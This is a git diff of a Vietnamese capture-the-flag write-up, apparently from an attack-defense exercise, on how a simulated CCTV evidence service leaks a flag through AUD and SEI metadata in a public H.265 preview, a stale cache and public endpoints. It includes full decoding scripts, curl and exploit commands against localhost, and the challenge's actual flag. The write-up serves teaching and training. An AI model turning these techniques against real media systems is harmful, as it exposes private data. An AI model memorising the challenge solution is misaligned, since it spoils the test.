@@ -2,8 +2,7 @@
 
 ## Tổng Quan Lỗi
 
-Service lưu bằng chứng CCTV dưới dạng H.265. File gốc là dữ liệu riêng tư, chỉ ai có
-`operator token` mới đọc được qua `/api/read` hoặc `/api/carrier`.
+Service giả lập một cổng lưu trữ bằng chứng CCTV. Người dùng hợp lệ có `operator token` mới được đọc dữ liệu gốc qua các route riêng tư như `/api/read` hoặc `/api/carrier`.
 
 Lỗi nằm ở file xem trước công khai:
 
@@ -11,26 +10,31 @@ Lỗi nằm ở file xem trước công khai:
 /api/cases/<case_id>/redacted-preview.h265
 ```
 
-Backend tạo file này bằng cách copy nhiều NAL từ file gốc sang preview. Trong H.265,
-NAL không chỉ chứa hình ảnh mà còn có dữ liệu phụ. Vì vậy flag/custody marker có thể
-bị lộ qua nhiều đường khác nhau.
+File này được gọi là preview đã che, nhưng backend vẫn giữ lại một số NAL phụ của H.265 từ file gốc. Trong H.265, NAL không chỉ có khung hình video. Nó còn có các phần phụ như AUD, SEI, VPS, SPS, PPS. Nếu đưa nhầm dữ liệu nhạy cảm vào các NAL phụ, rồi lại copy chúng sang preview công khai, người ngoài có thể tải preview và tách ngược cờ.
 
-Mục tiêu của attacker là lấy flag từ các dữ liệu công khai, không cần token.
+Trong bài này có nhiều hướng khai thác xoay quanh cùng một lỗi tổng quát:
 
-## Dữ Liệu Cần Có Trước Khi Khai Thác
-
-Hầu hết các hướng đều cần hai thứ:
-
-- `case_id`
-- file `redacted-preview.h265`
-
-Lấy danh sách case:
-
-```bash
-curl http://127.0.0.1:8000/api/cases
+```text
+Preview công khai vẫn chứa metadata hoặc dấu vết nội bộ từ video gốc riêng tư.
 ```
 
-Ví dụ response:
+Mục tiêu của attacker là lấy flag từ dữ liệu công khai, không cần token.
+
+## Dữ Liệu Cần Có
+
+Trước khi khai thác cần có:
+
+- địa chỉ service, ví dụ `http://127.0.0.1:8000`
+- `case_id`
+- file preview công khai `redacted-preview.h265`
+
+Liệt kê các case công khai:
+
+```powershell
+curl.exe http://127.0.0.1:8000/api/cases
+```
+
+Ví dụ kết quả:
 
 ```json
 {
@@ -38,21 +42,29 @@ Ví dụ response:
   "items": [
     {
       "id": "flag_1780132060_da66f92c",
-      "preview_url": "/api/cases/flag_1780132060_da66f92c/redacted-preview.h265"
+      "preview_url": "/api/cases/flag_1780132060_da66f92c/redacted-preview.h265",
+      "source": "lobby_cam_01"
     }
   ]
 }
 ```
 
-Tải preview:
+Trong ví dụ trên:
 
-```bash
-curl -L -o preview.h265 http://127.0.0.1:8000/api/cases/flag_1780132060_da66f92c/redacted-preview.h265
+```text
+case_id = flag_1780132060_da66f92c
+preview_url = /api/cases/flag_1780132060_da66f92c/redacted-preview.h265
 ```
 
-Kiểm tra file là H.265:
+Tải preview:
 
-```bash
+```powershell
+curl.exe -L -o preview.h265 http://127.0.0.1:8000/api/cases/flag_1780132060_da66f92c/redacted-preview.h265
+```
+
+Kiểm tra file có phải luồng H.265 hợp lệ không:
+
+```powershell
 ffprobe -v error -show_entries stream=codec_name,width,height -of default=noprint_wrappers=1 preview.h265
 ```
 
@@ -64,211 +76,444 @@ width=640
 height=360
 ```
 
-Sau khi có `case_id` và preview, bắt đầu thử từng hướng dưới đây.
+Nếu preview tải được và `ffprobe` đọc được `hevc`, bắt đầu thử các hướng bên dưới.
 
 ## Hướng 1 - Lấy Cờ Qua AUD NAL
 
-### Khi nào dùng được?
+### Khi Nào Dùng Được?
 
 Dùng hướng này khi preview còn AUD NAL type `35`.
 
-Kiểm tra:
+Kiểm tra nhanh:
 
-```bash
+```powershell
 python -c "from pathlib import Path; import sys; sys.path.insert(0,'solution'); from exploit import find_nals,nal_type; data=Path('preview.h265').read_bytes(); print(sum(1 for n in find_nals(data) if nal_type(n)==35))"
 ```
 
-Nếu số in ra lớn hơn `0`, có thể thử hướng AUD.
+Nếu số in ra lớn hơn `0`, preview vẫn còn AUD. Đây là dấu hiệu tốt cho hướng khai thác đầu tiên.
 
-### Vì sao lấy được cờ?
+### Vì Sao Lấy Được Cờ?
 
-Service giấu bit vào AUD. Với mỗi AUD, bit được lấy từ:
+AUD là viết tắt của Access Unit Delimiter. Bình thường AUD chỉ giúp đánh dấu ranh giới đơn vị truy cập trong luồng video. Ở bài này, service lạm dụng AUD để nhét bit của flag vào trường `primary_pic_type`.
+
+Với mỗi AUD, attacker đọc bit như sau:
 
 ```python
 primary_pic_type = (nal[2] >> 5) & 0x07
 bit = primary_pic_type & 1
 ```
 
-Flag được đóng gói thành:
+Flag không được ghi thẳng. Nó được đóng gói thành packet:
 
 ```text
-H5AD || độ dài 2 byte || flag || crc32(flag)
+H5AD || độ dài flag 2 byte || flag || crc32(flag)
 ```
 
-Trước khi ghi vào AUD, service xử lý thêm:
+Sau đó backend làm thêm ba việc để khiến việc đọc không quá lộ:
 
 ```text
-packet -> bit -> XOR theo case_id -> mã Manchester -> chèn AUD giả
+packet -> chuyển thành bit -> XOR theo case_id -> mã Manchester -> chèn AUD giả
 ```
 
-Vì `case_id` bị lộ qua `/api/cases`, attacker có thể sinh lại nhịp AUD giả và mặt nạ XOR
-để giải ngược.
+Nhưng `case_id` lại công khai trong `/api/cases`, nên attacker có thể sinh lại đúng nhịp AUD giả và dòng XOR để giải ngược.
 
-### Cách khai thác thủ công
+### Cách Khai Thác Thủ Công
 
-1. Tách các NAL trong `preview.h265`.
-2. Lọc NAL type `35`.
-3. Lấy `primary_pic_type & 1` từ từng AUD.
-4. Dùng `case_id` để bỏ AUD giả.
+Các bước làm tay:
+
+1. Tách toàn bộ NAL trong `preview.h265`.
+2. Chỉ giữ NAL type `35`.
+3. Với mỗi AUD, lấy bit thấp nhất của `primary_pic_type`.
+4. Dùng `case_id` để bỏ qua các AUD giả.
 5. Giải mã Manchester.
-6. XOR ngược bằng `case_id`.
-7. Tìm packet bắt đầu bằng `H5AD`.
-8. Đọc độ dài flag.
-9. Kiểm tra `crc32`.
-10. In ra flag.
+6. XOR ngược bằng dòng byte sinh từ `case_id`.
+7. Ghép bit thành byte.
+8. Tìm packet có magic `H5AD`.
+9. Đọc độ dài flag và kiểm tra `crc32`.
+10. In flag.
 
-### Lệnh khai thác
+Đây là script thủ công cho riêng hướng AUD. Script này không dùng `solution/exploit.py`, chỉ tự tách NAL và tự giải mã:
 
-```bash
-python solution/exploit.py http://127.0.0.1:8000 --id flag_1780132060_da66f92c --vector aud
+```python
+# aud_manual.py
+from pathlib import Path
+import hashlib
+import struct
+import zlib
+
+case_id = "flag_1780132060_da66f92c"
+data = Path("preview.h265").read_bytes()
+
+
+def byte_stream(seed: str, label: bytes):
+    counter = 0
+    seed_bytes = seed.encode()
+    while True:
+        block = hashlib.sha256(label + seed_bytes + counter.to_bytes(4, "big")).digest()
+        counter += 1
+        for value in block:
+            yield value
+
+
+def find_nals(raw: bytes):
+    starts = []
+    i = 0
+    while i < len(raw) - 3:
+        if raw[i:i + 4] == b"\x00\x00\x00\x01":
+            starts.append((i, 4))
+            i += 4
+        elif raw[i:i + 3] == b"\x00\x00\x01":
+            starts.append((i, 3))
+            i += 3
+        else:
+            i += 1
+
+    for idx, (start, size) in enumerate(starts):
+        end = starts[idx + 1][0] if idx + 1 < len(starts) else len(raw)
+        nal = raw[start + size:end]
+        if nal:
+            yield nal
+
+
+def nal_type(nal: bytes) -> int:
+    if len(nal) < 2:
+        return -1
+    return (nal[0] >> 1) & 0x3F
+
+
+def bits_to_bytes(bits):
+    out = bytearray()
+    for i in range(0, len(bits) - 7, 8):
+        value = 0
+        for bit in bits[i:i + 8]:
+            value = (value << 1) | bit
+        out.append(value)
+    return bytes(out)
+
+
+def manchester_decode(bits):
+    decoded = []
+    for i in range(0, len(bits) - 1, 2):
+        pair = bits[i:i + 2]
+        if pair == [0, 1]:
+            decoded.append(0)
+        elif pair == [1, 0]:
+            decoded.append(1)
+        else:
+            raise SystemExit(f"bad Manchester pair at bit {i}: {pair}")
+    return decoded
+
+
+def xor_bits(bits, seed: str):
+    stream = byte_stream(seed, b"h265-ad-mask:")
+    out = []
+    current = 0
+    remaining = 0
+    for bit in bits:
+        if remaining == 0:
+            current = next(stream)
+            remaining = 8
+        remaining -= 1
+        out.append(bit ^ ((current >> remaining) & 1))
+    return out
+
+
+aud_bits = []
+for nal in find_nals(data):
+    if nal_type(nal) != 35 or len(nal) < 3:
+        continue
+    primary_pic_type = (nal[2] >> 5) & 0x07
+    aud_bits.append(primary_pic_type & 1)
+
+print(f"AUD bit count: {len(aud_bits)}")
+
+encoded_bits = []
+pos = 0
+cadence = byte_stream(case_id, b"h265-ad-cadence:")
+
+while pos < len(aud_bits):
+    decoy_count = 1 + (next(cadence) % 3)
+
+    for _ in range(decoy_count):
+        if pos >= len(aud_bits):
+            break
+        next(cadence)
+        pos += 1
+
+    if pos >= len(aud_bits):
+        break
+
+    next(cadence)
+    encoded_bits.append(aud_bits[pos])
+    pos += 1
+
+plain_bits = xor_bits(manchester_decode(encoded_bits), case_id)
+header = bits_to_bytes(plain_bits[:48])
+
+if header[:4] != b"H5AD":
+    raise SystemExit("Không thấy packet H5AD. Sai case_id hoặc preview không còn AUD leak.")
+
+size = struct.unpack(">H", header[4:6])[0]
+packet = bits_to_bytes(plain_bits[:(10 + size) * 8])
+flag = packet[6:6 + size]
+crc_expected = struct.unpack(">I", packet[6 + size:10 + size])[0]
+crc_actual = zlib.crc32(flag) & 0xFFFFFFFF
+
+if crc_actual != crc_expected:
+    raise SystemExit("CRC sai. Dữ liệu bị thiếu hoặc giải sai.")
+
+print(flag.decode())
+```
+
+### Lệnh Khai Thác
+
+Sau khi dùng đoạn code trên làm file `aud_manual.py`, chạy thủ công hướng AUD:
+
+```powershell
+python aud_manual.py
 ```
 
 Kết quả thành công:
 
 ```text
-blockChainPTIT{...}
+AUD bit count: 2978
+blockChainPTIT{4ud_n4l_d3bug_l34k_br34ks_h265_v4ult}
 ```
 
-### Nếu thất bại thì hiểu sao?
+Lệnh tự động tương đương:
 
-- Không còn AUD: defender đã xóa AUD khỏi preview.
-- CRC sai: bit lấy ra bị thiếu hoặc sai `case_id`.
-- Không thấy `H5AD`: dữ liệu trong AUD không còn là marker hợp lệ.
+```powershell
+python solution/exploit.py http://127.0.0.1:8000 --id flag_1780132060_da66f92c --vector aud
+```
 
-Khi hướng AUD thất bại, chuyển sang hướng SEI.
+### Nếu Thất Bại Thì Hiểu Sao?
+
+- Không còn AUD: defender đã xóa AUD type `35` khỏi preview.
+- Không thấy `H5AD`: sai `case_id`, hoặc AUD không còn chứa packet hợp lệ.
+- CRC sai: lấy thiếu bit, sai nhịp AUD giả, hoặc file preview đã bị làm sạch một phần.
+
+Nếu hướng AUD thất bại, chuyển sang hướng SEI.
 
 ## Hướng 2 - Lấy Cờ Qua SEI NAL
 
-### Khi nào dùng được?
+### Khi Nào Dùng Được?
 
 Dùng hướng này khi preview còn SEI NAL type `39` hoặc `40`.
 
-Kiểm tra:
+Kiểm tra nhanh:
 
-```bash
+```powershell
 python -c "from pathlib import Path; import sys; sys.path.insert(0,'solution'); from exploit import find_nals,nal_type; data=Path('preview.h265').read_bytes(); print({t:sum(1 for n in find_nals(data) if nal_type(n)==t) for t in (39,40)})"
 ```
 
-Nếu type `39` hoặc `40` lớn hơn `0`, có thể thử hướng SEI.
+Nếu type `39` hoặc `40` lớn hơn `0`, preview vẫn còn SEI.
 
-### Vì sao lấy được cờ?
+### Vì Sao Lấy Được Cờ?
 
-Trong bài này SEI chứa dấu vết gỡ lỗi dạng:
+SEI là vùng dữ liệu phụ trong H.265. Nó thường dùng để chứa thông tin bổ sung cho bộ giải mã, metadata, hoặc thông tin phụ do phần mềm thêm vào.
+
+Trong bài này, backend để sót một trace gỡ lỗi trong SEI:
 
 ```text
 H5DBG || độ dài 2 byte || packet đã XOR
 ```
 
-`packet đã XOR` thực chất là packet chứa flag, nhưng bị XOR bằng dòng byte sinh từ
-`case_id`.
-
-Nhãn sinh khóa:
+`packet đã XOR` là packet chứa flag, nhưng bị XOR với dòng byte sinh từ `case_id` và nhãn:
 
 ```text
 h265-ad-sei-trace:
 ```
 
-Vì attacker biết `case_id`, attacker có thể tạo lại dòng byte đó và XOR ngược.
+Vì `case_id` công khai, attacker tạo lại dòng byte đó rồi XOR ngược để lấy packet thật.
 
-### Cách khai thác thủ công
+### Cách Khai Thác Thủ Công
 
-1. Tách NAL trong preview.
-2. Lọc NAL type `39` và `40`.
-3. Bỏ 2 byte header NAL để lấy payload.
-4. Tìm chuỗi `H5DBG`.
-5. Đọc 2 byte độ dài sau `H5DBG`.
-6. Lấy đúng số byte dữ liệu đã XOR.
-7. Sinh dòng byte bằng `SHA256("h265-ad-sei-trace:" || case_id || counter)`.
+Các bước làm tay:
+
+1. Tách toàn bộ NAL trong `preview.h265`.
+2. Chỉ giữ NAL type `39` và `40`.
+3. Bỏ 2 byte header NAL.
+4. Tìm magic `H5DBG` trong payload.
+5. Đọc 2 byte độ dài ngay sau `H5DBG`.
+6. Lấy đúng số byte dữ liệu đã bị XOR.
+7. Sinh dòng byte từ `case_id` với nhãn `h265-ad-sei-trace:`.
 8. XOR ngược để lấy packet thật.
 9. Parse packet `H5AD`.
 10. Kiểm tra `crc32`.
-11. In ra flag.
+11. In flag.
 
-### Lệnh khai thác
+Đây là script thủ công cho riêng hướng SEI. Script này cũng không dùng `solution/exploit.py`:
 
-```bash
+```python
+# sei_manual.py
+from pathlib import Path
+import hashlib
+import struct
+import zlib
+
+case_id = "flag_1780132060_da66f92c"
+data = Path("preview.h265").read_bytes()
+
+
+def byte_stream(seed: str, label: bytes):
+    counter = 0
+    seed_bytes = seed.encode()
+    while True:
+        block = hashlib.sha256(label + seed_bytes + counter.to_bytes(4, "big")).digest()
+        counter += 1
+        for value in block:
+            yield value
+
+
+def xor_bytes(raw: bytes, seed: str, label: bytes):
+    stream = byte_stream(seed, label)
+    return bytes(value ^ next(stream) for value in raw)
+
+
+def find_nals(raw: bytes):
+    starts = []
+    i = 0
+    while i < len(raw) - 3:
+        if raw[i:i + 4] == b"\x00\x00\x00\x01":
+            starts.append((i, 4))
+            i += 4
+        elif raw[i:i + 3] == b"\x00\x00\x01":
+            starts.append((i, 3))
+            i += 3
+        else:
+            i += 1
+
+    for idx, (start, size) in enumerate(starts):
+        end = starts[idx + 1][0] if idx + 1 < len(starts) else len(raw)
+        nal = raw[start + size:end]
+        if nal:
+            yield nal
+
+
+def nal_type(nal: bytes) -> int:
+    if len(nal) < 2:
+        return -1
+    return (nal[0] >> 1) & 0x3F
+
+
+for nal in find_nals(data):
+    if nal_type(nal) not in (39, 40):
+        continue
+
+    payload = nal[2:]
+    pos = payload.find(b"H5DBG")
+    if pos < 0:
+        continue
+
+    size_pos = pos + len(b"H5DBG")
+    size = struct.unpack(">H", payload[size_pos:size_pos + 2])[0]
+    start = size_pos + 2
+    masked_packet = payload[start:start + size]
+
+    if len(masked_packet) != size:
+        continue
+
+    packet = xor_bytes(masked_packet, case_id, b"h265-ad-sei-trace:")
+
+    if packet[:4] != b"H5AD":
+        continue
+
+    flag_size = struct.unpack(">H", packet[4:6])[0]
+    flag = packet[6:6 + flag_size]
+    crc_expected = struct.unpack(">I", packet[6 + flag_size:10 + flag_size])[0]
+    crc_actual = zlib.crc32(flag) & 0xFFFFFFFF
+
+    if crc_actual != crc_expected:
+        raise SystemExit("CRC sai. SEI có trace nhưng packet không hợp lệ.")
+
+    print(flag.decode())
+    break
+else:
+    raise SystemExit("Không tìm thấy SEI trace H5DBG.")
+```
+
+### Lệnh Khai Thác
+
+Sau khi dùng đoạn code trên làm file `sei_manual.py`, chạy thủ công hướng SEI:
+
+```powershell
+python sei_manual.py
+```
+
+Kết quả thành công:
+
+```text
+blockChainPTIT{4ud_n4l_d3bug_l34k_br34ks_h265_v4ult}
+```
+
+Lệnh tự động tương đương:
+
+```powershell
 python solution/exploit.py http://127.0.0.1:8000 --id flag_1780132060_da66f92c --vector sei
 ```
 
-Kết quả thành công:
+### Khi Nào Hướng Này Hữu Ích?
+
+Hướng SEI rất hữu ích khi defender chỉ vá kiểu:
 
 ```text
-blockChainPTIT{...}
+xóa AUD type 35
 ```
 
-### Khi nào hướng này đặc biệt hữu ích?
-
-Khi đội phòng thủ chỉ vá theo kiểu:
-
-```text
-strip AUD type 35
-```
-
-Lúc đó hướng AUD fail, nhưng SEI vẫn còn trong preview. Đây là ví dụ điển hình của việc
-defender vá một dấu hiệu cụ thể nhưng chưa vá lỗi tổng quát.
+Nếu SEI vẫn còn trong preview, attacker vẫn lấy được flag. Đây là ví dụ của việc vá theo dấu hiệu cụ thể nhưng chưa vá đúng lỗi tổng quát.
 
 ## Hướng 3 - Lấy Cờ Từ Preview Cache Cũ
 
-### Khi nào dùng được?
+### Khi Nào Dùng Được?
 
-Dùng hướng này sau khi defender đã vá code nhưng service vẫn còn trả file preview cũ.
+Dùng hướng này sau khi defender đã vá code nhưng service vẫn trả file preview cũ.
 
 Điều kiện:
 
-- Preview lỗi đã từng được render trước khi vá.
-- File đó vẫn nằm trong thư mục cache.
-- Backend chỉ kiểm tra file tồn tại rồi trả luôn, không kiểm tra phiên bản bộ làm sạch.
+- preview lỗi đã được render trước khi vá
+- file cũ vẫn nằm trong cache
+- backend thấy file có sẵn thì trả luôn, không tạo lại bản sạch
 
-### Vì sao lấy được cờ?
+### Vì Sao Lấy Được Cờ?
 
-Preview cũ là artifact đã sinh bởi code lỗi. Dù source code hiện tại đã vá, file cũ vẫn
-có thể chứa AUD/SEI leak.
+Preview cũ là file đã sinh bởi code lỗi. Dù source hiện tại đã vá, file cũ vẫn có thể chứa AUD hoặc SEI leak.
 
-Luồng lỗi:
+Luồng khai thác:
 
 ```text
-trước khi vá: tạo preview lỗi
--> sau khi vá: file lỗi vẫn còn trong cache
--> attacker tải lại preview
--> exploit chạy trên file cũ
+trước khi vá: service tạo preview lỗi
+sau khi vá: file lỗi vẫn còn trong cache
+attacker tải lại preview
+attacker giải AUD hoặc SEI trên file cũ
 ```
 
-### Cách khai thác
+### Cách Khai Thác
 
 Tải lại preview:
 
-```bash
-curl -L -o stale_preview.h265 http://127.0.0.1:8000/api/cases/flag_1780132060_da66f92c/redacted-preview.h265
+```powershell
+curl.exe -L -o stale_preview.h265 http://127.0.0.1:8000/api/cases/flag_1780132060_da66f92c/redacted-preview.h265
 ```
 
-Kiểm tra file cũ còn AUD/SEI không:
+Kiểm tra file cũ còn AUD hoặc SEI không:
 
-```bash
+```powershell
 python -c "from pathlib import Path; import sys; sys.path.insert(0,'solution'); from exploit import find_nals,nal_type; data=Path('stale_preview.h265').read_bytes(); print({t:sum(1 for n in find_nals(data) if nal_type(n)==t) for t in (35,39,40)})"
 ```
 
-Nếu còn `35`, `39` hoặc `40`, tiếp tục chạy exploit:
+Nếu còn type `35`, `39` hoặc `40`, dùng lại script thủ công ở hướng AUD hoặc SEI. Với bản tự động:
 
-```bash
+```powershell
 python solution/exploit.py http://127.0.0.1:8000 --id flag_1780132060_da66f92c --vector auto
 ```
 
-Kết quả thành công:
-
-```text
-blockChainPTIT{...}
-```
-
-### Điểm quan trọng
-
-Ở hướng này, attacker không cần tìm bug mới trong code. Attacker chỉ tận dụng file public
-cũ mà service vẫn đang trả.
+Điểm quan trọng của hướng này là attacker không cần tìm bug mới. Attacker chỉ tận dụng file public cũ mà service vẫn trả.
 
 ## Hướng 4 - Lấy Thông Tin Qua Share Và Manifest
 
-### Khi nào dùng?
+### Khi Nào Dùng?
 
-Dùng khi `/api/cases` không đủ thông tin hoặc bị ẩn.
+Dùng khi `/api/cases` bị ẩn hoặc không trả đủ thông tin.
 
 Thử các đường dẫn:
 
@@ -277,109 +522,115 @@ Thử các đường dẫn:
 /api/share/<share_id>/manifest.json
 ```
 
-### Có thể lấy được gì?
+### Có Thể Lấy Được Gì?
 
-Các endpoint này có thể cho biết:
+Các endpoint này có thể làm lộ:
 
 - `case_id`
 - `preview_url`
+- nguồn camera
 - codec
-- camera/source
+- thời điểm tạo preview
 - loại artifact public
 
-### Cách dùng để lấy cờ
+### Cách Dùng Để Lấy Cờ
 
 1. Mở share hoặc manifest.
-2. Lấy `case_id` và `preview_url`.
-3. Tải preview.
-4. Thử hướng AUD.
-5. Nếu AUD thất bại, thử hướng SEI.
-6. Nếu cả hai thất bại, kiểm tra preview cache cũ.
+2. Tìm `case_id`.
+3. Tìm `preview_url`.
+4. Tải preview.
+5. Kiểm tra AUD type `35`.
+6. Nếu có AUD, dùng hướng 1.
+7. Nếu AUD không còn, kiểm tra SEI type `39` hoặc `40`.
+8. Nếu có SEI, dùng hướng 2.
+9. Nếu cả hai đều không có, kiểm tra hướng cache cũ.
 
-Share/manifest thường không trả flag trực tiếp, nhưng giúp tìm đúng file cần khai thác.
+Share và manifest thường không trả flag trực tiếp. Chúng giúp attacker tìm đúng file cần khai thác.
 
 ## Hướng 5 - Lấy Thông Tin Qua Nhật Ký Và Hàng Đợi Preview
 
-### Khi nào dùng?
+### Khi Nào Dùng?
 
-Dùng để tìm case mới, case vừa được checker đặt flag hoặc preview vừa render xong.
+Dùng để tìm case mới, case vừa được checker đặt flag, hoặc preview vừa render xong.
 
 Thử:
 
-```bash
-curl http://127.0.0.1:8000/api/audit
-curl http://127.0.0.1:8000/api/preview-jobs
+```powershell
+curl.exe http://127.0.0.1:8000/api/audit
+curl.exe http://127.0.0.1:8000/api/preview-jobs
 ```
 
-### Có thể tận dụng gì?
+### Có Thể Tận Dụng Gì?
 
-Nếu public, các endpoint này có thể giúp biết:
+Nếu public, các endpoint này có thể làm lộ:
 
-- case nào mới được import
-- preview nào đã sẵn sàng
-- case nào vừa được tải preview
-- lúc nào nên tải lại preview
+- case nào vừa được import
+- case nào vừa có flag mới
+- preview nào đã render xong
+- preview nào đang nằm trong cache
+- thời điểm nên tải lại preview
 
-### Cách dùng để lấy cờ
+### Cách Dùng Để Lấy Cờ
 
-1. Xem audit để tìm `case_imported`.
+1. Xem audit để tìm sự kiện tạo case.
 2. Lấy `case_id` mới.
-3. Xem preview job của case đó đã `ready` chưa.
-4. Nếu ready, tải preview.
-5. Chạy exploit `--vector auto`.
+3. Xem hàng đợi preview để biết preview đã `ready` chưa.
+4. Khi preview sẵn sàng, tải file `.h265`.
+5. Thử hướng AUD.
+6. Nếu AUD fail, thử hướng SEI.
 
-Đây là hướng hỗ trợ chọn mục tiêu. Nó không phải hướng giải mã flag trực tiếp, nhưng giúp
-attacker đánh đúng case đang có flag mới.
+Đây là hướng hỗ trợ chọn mục tiêu. Nó không tự giải mã flag, nhưng giúp attacker đánh đúng case đang có flag mới.
 
-## Hướng 6 - Kiểm Tra Lỗi Phân Quyền Ở Route Private
+## Hướng 6 - Kiểm Tra Lỗi Phân Quyền Ở Route Riêng Tư
 
-### Khi nào dùng?
+### Khi Nào Dùng?
 
 Luôn nên thử nhanh trước khi phân tích H.265 sâu.
 
-Hai route private:
+Hai route riêng tư:
 
 ```text
 POST /api/read
 POST /api/carrier
 ```
 
-đáng ra phải yêu cầu token đúng.
+Đáng ra phải yêu cầu token đúng.
 
-### Cách thử
+### Cách Thử
 
-```bash
-curl -X POST http://127.0.0.1:8000/api/read ^
-  -H "Content-Type: application/json" ^
+Thử đọc với token sai:
+
+```powershell
+curl.exe -X POST http://127.0.0.1:8000/api/read `
+  -H "Content-Type: application/json" `
   -d "{\"id\":\"flag_1780132060_da66f92c\",\"token\":\"wrong-token\"}"
 ```
 
 Kết quả đúng là bị từ chối.
 
-### Nếu lấy được cờ thì sao?
+Nếu token sai mà server vẫn trả marker hoặc carrier gốc, đó là lỗi phân quyền trực tiếp. Khi đó không cần khai thác AUD hoặc SEI nữa.
 
-Nếu token sai mà server vẫn trả marker, đó là lỗi phân quyền trực tiếp. Khi đó không cần
-khai thác AUD/SEI nữa.
-
-Trong bản hiện tại, route private làm đúng. Vì vậy hướng chính vẫn là preview public.
+Trong bản hiện tại, route riêng tư đã kiểm tra token. Vì vậy hướng chính vẫn là preview công khai.
 
 ## Khai Thác Tự Động
 
-Nếu đã có `case_id`:
+Sau khi hiểu cách làm tay, có thể dùng script tự động có sẵn để tiết kiệm thời gian.
 
-```bash
+Nếu đã biết `case_id`:
+
+```powershell
 python solution/exploit.py http://127.0.0.1:8000 --id flag_1780132060_da66f92c --vector auto
 ```
 
-Nếu chưa có `case_id`:
+Nếu chưa biết `case_id`, script sẽ gọi `/api/cases` để lấy danh sách:
 
-```bash
+```powershell
 python solution/exploit.py http://127.0.0.1:8000 --vector auto
 ```
 
 Chạy riêng từng hướng:
 
-```bash
+```powershell
 python solution/exploit.py http://127.0.0.1:8000 --id flag_1780132060_da66f92c --vector aud
 python solution/exploit.py http://127.0.0.1:8000 --id flag_1780132060_da66f92c --vector sei
 ```
@@ -387,17 +638,16 @@ python solution/exploit.py http://127.0.0.1:8000 --id flag_1780132060_da66f92c -
 Cách đọc kết quả:
 
 - `aud` thành công: preview còn AUD leak.
-- `aud` thất bại, `sei` thành công: defender chỉ vá AUD.
-- Cả hai thất bại nhưng file cũ còn AUD/SEI: vấn đề nằm ở cache.
-- Cả hai thất bại và preview không còn AUD/SEI: đường preview đã được vá khá tốt.
+- `aud` thất bại nhưng `sei` thành công: defender chỉ vá AUD, SEI vẫn hở.
+- cả hai thất bại nhưng file cũ còn AUD/SEI: lỗi nằm ở cache.
+- cả hai thất bại và preview không còn AUD/SEI: đường preview đã được làm sạch tốt hơn.
 
 ## Kết Luận
 
-Tất cả hướng tấn công đều xoay quanh một câu hỏi:
+Bài này không phải lỗi lấy flag bằng một endpoint trả thẳng flag. Attacker cần đi theo chuỗi:
 
 ```text
-Preview công khai còn giữ dữ liệu gì từ file gốc riêng tư?
+tìm case_id -> tải preview công khai -> phân tích NAL -> tách metadata bị sót -> giải ngược packet -> lấy flag
 ```
 
-Nếu preview còn AUD, SEI, dấu vết gỡ lỗi, cache cũ hoặc endpoint public giúp tìm đúng
-artifact, attacker vẫn có thể tiếp tục tìm cách lấy flag.
+Các hướng khai thác khác nhau nhưng cùng nhắm vào một bản chất: preview công khai không được làm sạch triệt để trước khi trả cho người ngoài.
